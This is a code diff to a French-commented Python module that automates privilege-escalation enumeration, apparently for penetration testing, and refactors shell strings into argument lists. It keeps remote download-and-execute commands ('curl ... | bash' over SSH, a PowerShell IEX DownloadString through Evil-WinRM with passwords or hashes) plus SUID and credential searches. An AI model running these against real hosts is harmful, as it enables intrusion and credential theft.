@@ -6,7 +6,7 @@ PEAS Module (LinPEAS / WinPEAS)
 
 from typing import Dict, Any, List, Optional
 from datetime import datetime
-from core.executor import CommandExecutor, escape_shell_arg
+from core.executor import CommandExecutor
 import os
 import re
 
@@ -28,6 +28,20 @@ class PEASModule:
         # URLs des scripts PEAS
         self.linpeas_url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
         self.winpeas_url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
+
+    def _sanitize_int(self, value: Any, default: int, minimum: int, maximum: int) -> int:
+        try:
+            parsed = int(value)
+        except (TypeError, ValueError):
+            return default
+        return max(minimum, min(parsed, maximum))
+
+    def _write_output_file(self, output_file: str, content: str):
+        try:
+            with open(output_file, 'w', encoding='utf-8', errors='replace') as f:
+                f.write(content or "")
+        except Exception:
+            pass
     
     async def linpeas_local(self, target: str = "localhost", options: Dict[str, Any] = None) -> Dict[str, Any]:
         """
@@ -49,11 +63,54 @@ class PEASModule:
         # Télécharger et exécuter ou utiliser la version locale
         linpeas_path = options.get("linpeas_path")
         if linpeas_path and os.path.exists(linpeas_path):
-            cmd = f"bash {escape_shell_arg(linpeas_path)} {flags} | tee {output_file}"
+            command_args = ["bash", linpeas_path]
+            if flags.strip():
+                command_args.extend(flags.strip().split())
+            result = await self.executor.run_args(command_args, timeout=1200)
         else:
-            cmd = f"curl -sL {self.linpeas_url} | bash -s -- {flags} | tee {output_file}"
-        
-        result = await self.executor.run(cmd, timeout=1200)  # 20 minutes max
+            download_path = f"/tmp/linpeas_{int(datetime.now().timestamp())}.sh"
+            dl_result = await self.executor.run_args(["curl", "-sL", self.linpeas_url, "-o", download_path], timeout=120)
+            if dl_result.return_code != 0:
+                return {
+                    "action": "linpeas",
+                    "target": target,
+                    "status": "error",
+                    "command": dl_result.command,
+                    "output": dl_result.stdout,
+                    "error": dl_result.stderr,
+                    "duration": dl_result.duration,
+                    "timestamp": dl_result.timestamp,
+                    "parsed_data": {
+                        "output_file": output_file,
+                        "findings": [],
+                        "critical_count": 0,
+                        "high_count": 0
+                    }
+                }
+            chmod_result = await self.executor.run_args(["chmod", "+x", download_path], timeout=30)
+            if chmod_result.return_code != 0:
+                return {
+                    "action": "linpeas",
+                    "target": target,
+                    "status": "error",
+                    "command": chmod_result.command,
+                    "output": chmod_result.stdout,
+                    "error": chmod_result.stderr,
+                    "duration": chmod_result.duration,
+                    "timestamp": chmod_result.timestamp,
+                    "parsed_data": {
+                        "output_file": output_file,
+                        "findings": [],
+                        "critical_count": 0,
+                        "high_count": 0
+                    }
+                }
+            command_args = ["bash", download_path]
+            if flags.strip():
+                command_args.extend(flags.strip().split())
+            result = await self.executor.run_args(command_args, timeout=1200)
+
+        self._write_output_file(output_file, result.stdout)
         
         # Parser les résultats pour les points critiques
         findings = self._parse_linpeas_output(result.stdout)
@@ -62,7 +119,7 @@ class PEASModule:
             "action": "linpeas",
             "target": target,
             "status": "completed" if result.return_code == 0 else "error",
-            "command": cmd,
+            "command": result.command,
             "output": result.stdout,
             "error": result.stderr if result.return_code != 0 else None,
             "duration": result.duration,
@@ -80,29 +137,33 @@ class PEASModule:
         Exécute LinPEAS sur une cible distante via SSH
         """
         options = options or {}
-        target_safe = escape_shell_arg(target)
         
         username = options.get("username", "")
         password = options.get("password", "")
         key_file = options.get("key_file", "")
-        port = options.get("port", 22)
+        port = self._sanitize_int(options.get("port"), 22, 1, 65535)
         
         output_file = f"{self.output_dir}/linpeas_{target.replace('.', '_')}_{int(datetime.now().timestamp())}.txt"
-        
-        # Construire la commande SSH
-        ssh_opts = f"-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p {port}"
-        
+
+        ssh_args = [
+            "ssh",
+            "-o", "StrictHostKeyChecking=no",
+            "-o", "UserKnownHostsFile=/dev/null",
+            "-p", str(port)
+        ]
+
         if key_file:
-            ssh_cmd = f"ssh {ssh_opts} -i {escape_shell_arg(key_file)} {escape_shell_arg(username)}@{target_safe}"
+            ssh_args.extend(["-i", str(key_file)])
+            cmd_args = ssh_args + [f"{username}@{target}", f"curl -sL {self.linpeas_url} | bash"]
+            result = await self.executor.run_args(cmd_args, timeout=1200)
         elif password:
-            ssh_cmd = f"sshpass -p {escape_shell_arg(password)} ssh {ssh_opts} {escape_shell_arg(username)}@{target_safe}"
+            cmd_args = ["sshpass", "-p", str(password)] + ssh_args + [f"{username}@{target}", f"curl -sL {self.linpeas_url} | bash"]
+            result = await self.executor.run_args(cmd_args, timeout=1200)
         else:
-            ssh_cmd = f"ssh {ssh_opts} {escape_shell_arg(username)}@{target_safe}"
-        
-        # Exécuter LinPEAS à distance
-        cmd = f"{ssh_cmd} 'curl -sL {self.linpeas_url} | bash' | tee {output_file}"
-        
-        result = await self.executor.run(cmd, timeout=1200)
+            cmd_args = ssh_args + [f"{username}@{target}", f"curl -sL {self.linpeas_url} | bash"]
+            result = await self.executor.run_args(cmd_args, timeout=1200)
+
+        self._write_output_file(output_file, result.stdout)
         
         findings = self._parse_linpeas_output(result.stdout)
         
@@ -110,7 +171,7 @@ class PEASModule:
             "action": "linpeas_remote",
             "target": target,
             "status": "completed" if result.return_code == 0 else "error",
-            "command": cmd.replace(password, "****") if password else cmd,
+            "command": result.command.replace(password, "****") if password else result.command,
             "output": result.stdout,
             "error": result.stderr if result.return_code != 0 else None,
             "duration": result.duration,
@@ -162,7 +223,6 @@ class PEASModule:
         Exécute WinPEAS via Evil-WinRM
         """
         options = options or {}
-        target_safe = escape_shell_arg(target)
         
         username = options.get("username", "")
         password = options.get("password", "")
@@ -171,19 +231,18 @@ class PEASModule:
         output_file = f"{self.output_dir}/winpeas_{target.replace('.', '_')}_{int(datetime.now().timestamp())}.txt"
         
         # Construire la commande Evil-WinRM
-        base_cmd = f"evil-winrm -i {target_safe} -u {escape_shell_arg(username)}"
-        
+        base_args = ["evil-winrm", "-i", target, "-u", str(username)]
+
         if password:
-            base_cmd += f" -p {escape_shell_arg(password)}"
+            base_args.extend(["-p", str(password)])
         elif hash_val:
-            base_cmd += f" -H {escape_shell_arg(hash_val)}"
+            base_args.extend(["-H", str(hash_val)])
         
         # Télécharger et exécuter WinPEAS
         ps_cmd = f"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
-        
-        cmd = f"echo \"{ps_cmd}\" | {base_cmd} | tee {output_file}"
-        
-        result = await self.executor.run(cmd, timeout=1200)
+
+        result = await self.executor.run_args(base_args, timeout=1200, stdin_data=f"{ps_cmd}\n")
+        self._write_output_file(output_file, result.stdout)
         
         findings = self._parse_winpeas_output(result.stdout)
         
@@ -191,7 +250,7 @@ class PEASModule:
             "action": "winpeas",
             "target": target,
             "status": "completed" if result.return_code == 0 else "error",
-            "command": base_cmd.replace(password, "****") if password else base_cmd,
+            "command": result.command.replace(password, "****") if password else result.command,
             "output": result.stdout,
             "error": result.stderr if result.return_code != 0 else None,
             "duration": result.duration,
@@ -209,19 +268,36 @@ class PEASModule:
         options = options or {}
         
         output_file = f"{self.output_dir}/lse_{int(datetime.now().timestamp())}.txt"
-        level = options.get("level", 1)  # 0, 1, 2
+        level = self._sanitize_int(options.get("level"), 1, 0, 2)  # 0, 1, 2
         
         lse_url = "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh"
-        
-        cmd = f"curl -sL {lse_url} | bash -s -- -l {level} | tee {output_file}"
-        
-        result = await self.executor.run(cmd, timeout=600)
+
+        script_path = f"/tmp/lse_{int(datetime.now().timestamp())}.sh"
+        dl_result = await self.executor.run_args(["curl", "-sL", lse_url, "-o", script_path], timeout=120)
+        if dl_result.return_code != 0:
+            return {
+                "action": "lse",
+                "target": target,
+                "status": "error",
+                "command": dl_result.command,
+                "output": dl_result.stdout,
+                "error": dl_result.stderr,
+                "duration": dl_result.duration,
+                "timestamp": dl_result.timestamp,
+                "parsed_data": {
+                    "output_file": output_file,
+                    "level": level
+                }
+            }
+        await self.executor.run_args(["chmod", "+x", script_path], timeout=30)
+        result = await self.executor.run_args(["bash", script_path, "-l", str(level)], timeout=600)
+        self._write_output_file(output_file, result.stdout)
         
         return {
             "action": "lse",
             "target": target,
             "status": "completed" if result.return_code == 0 else "error",
-            "command": cmd,
+            "command": result.command,
             "output": result.stdout,
             "error": result.stderr if result.return_code != 0 else None,
             "duration": result.duration,
@@ -240,13 +316,31 @@ class PEASModule:
         options = options or {}
         
         output_file = f"{self.output_dir}/pspy_{int(datetime.now().timestamp())}.txt"
-        duration = options.get("duration", 60)  # Durée de surveillance en secondes
+        duration = self._sanitize_int(options.get("duration"), 60, 5, 3600)  # Durée de surveillance en secondes
         
         pspy_url = "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64"
-        
-        cmd = f"timeout {duration} bash -c 'curl -sL {pspy_url} -o /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy' | tee {output_file}"
-        
-        result = await self.executor.run(cmd, timeout=duration + 30)
+
+        pspy_path = f"/tmp/pspy_{int(datetime.now().timestamp())}"
+        dl_result = await self.executor.run_args(["curl", "-sL", pspy_url, "-o", pspy_path], timeout=120)
+        if dl_result.return_code != 0:
+            return {
+                "action": "pspy",
+                "target": target,
+                "status": "error",
+                "command": dl_result.command,
+                "output": dl_result.stdout,
+                "error": dl_result.stderr,
+                "duration": dl_result.duration,
+                "timestamp": dl_result.timestamp,
+                "parsed_data": {
+                    "output_file": output_file,
+                    "monitoring_duration": duration,
+                    "interesting_processes": []
+                }
+            }
+        await self.executor.run_args(["chmod", "+x", pspy_path], timeout=30)
+        result = await self.executor.run_args(["timeout", str(duration), pspy_path], timeout=duration + 30)
+        self._write_output_file(output_file, result.stdout)
         
         # Parser les processus intéressants
         processes = self._parse_pspy_output(result.stdout)
@@ -255,7 +349,7 @@ class PEASModule:
             "action": "pspy",
             "target": target,
             "status": "completed",
-            "command": cmd,
+            "command": result.command,
             "output": result.stdout,
             "duration": result.duration,
             "timestamp": result.timestamp,
@@ -273,9 +367,12 @@ class PEASModule:
         options = options or {}
         
         # Recherche SUID
-        cmd = "find / -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -la {} \\; 2>/dev/null"
-        
-        result = await self.executor.run(cmd, timeout=120)
+        cmd_args = [
+            "find", "/", "-type", "f", "(", "-perm", "-4000", "-o", "-perm", "-2000", ")",
+            "-exec", "ls", "-la", "{}", ";"
+        ]
+
+        result = await self.executor.run_args(cmd_args, timeout=120)
         
         # Parser et identifier les binaires intéressants
         suid_binaries = self._parse_suid_binaries(result.stdout)
@@ -284,7 +381,7 @@ class PEASModule:
             "action": "suid_search",
             "target": target,
             "status": "completed" if result.return_code == 0 else "error",
-            "command": cmd,
+            "command": result.command,
             "output": result.stdout,
             "error": result.stderr if result.return_code != 0 else None,
             "duration": result.duration,
@@ -316,23 +413,26 @@ class PEASModule:
         ]
         
         pattern = "|".join(search_patterns)
-        
+
         # Rechercher dans les fichiers courants
-        cmd = f"""
-grep -rniE '({pattern})' /etc /home /var/www /opt 2>/dev/null | head -500 | tee {output_file}
-"""
-        
-        result = await self.executor.run(cmd, timeout=300)
+        result = await self.executor.run_args(
+            ["grep", "-rniE", f"({pattern})", "/etc", "/home", "/var/www", "/opt"],
+            timeout=300
+        )
+
+        output_lines = result.stdout.splitlines()[:500]
+        limited_output = "\n".join(output_lines)
+        self._write_output_file(output_file, limited_output)
         
         # Parser les credentials potentiels
-        potential_creds = self._parse_credential_search(result.stdout)
+        potential_creds = self._parse_credential_search(limited_output)
         
         return {
             "action": "creds_search",
             "target": target,
             "status": "completed" if result.return_code == 0 else "error",
-            "command": "grep credentials search",
-            "output": result.stdout,
+            "command": result.command,
+            "output": limited_output,
             "duration": result.duration,
             "timestamp": result.timestamp,
             "parsed_data": {
